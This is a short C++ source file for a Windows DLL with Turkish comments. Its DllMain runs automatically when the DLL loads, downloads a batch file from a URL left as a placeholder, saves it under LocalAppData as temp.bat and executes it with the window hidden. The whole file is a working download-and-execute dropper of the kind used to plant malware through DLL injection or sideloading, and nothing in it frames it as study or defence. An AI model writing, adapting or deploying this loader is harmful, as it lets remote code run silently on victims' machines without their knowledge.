#include <iostream>
#include <windows.h>
#include <shlobj_core.h>

void GetLocalAppDataPath(char* buffer, DWORD bufferSize)
{
    PWSTR localAppDataPath;
    HRESULT result = SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, NULL, &localAppDataPath);
    if (SUCCEEDED(result))
    {
        wcstombs_s(NULL, buffer, bufferSize, localAppDataPath, _TRUNCATE);
        CoTaskMemFree(localAppDataPath);
    }
    else
    {
        // 
        // burayı elleme abi
    }
}

void DownloadAndExecute(const char* url)
{
    char localAppDataPath[MAX_PATH];
    GetLocalAppDataPath(localAppDataPath, MAX_PATH);

    const char* tempFileName = "\\temp.bat";
    char fullPath[MAX_PATH];
    sprintf_s(fullPath, "%s%s", localAppDataPath, tempFileName);

    HRESULT hr = URLDownloadToFileA(NULL, url, fullPath, 0, NULL);
    if (hr == S_OK)
    {
        ShellExecuteA(NULL, "open", fullPath, NULL, NULL, SW_HIDE);
    }
    else
    {
        // 
        // burayı bosver elleme abi
    }
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    if (fdwReason == DLL_PROCESS_ATTACH)
    {
        const char* url = "bat'ın direct linki";
        DownloadAndExecute(url);
    }
    return TRUE;
}
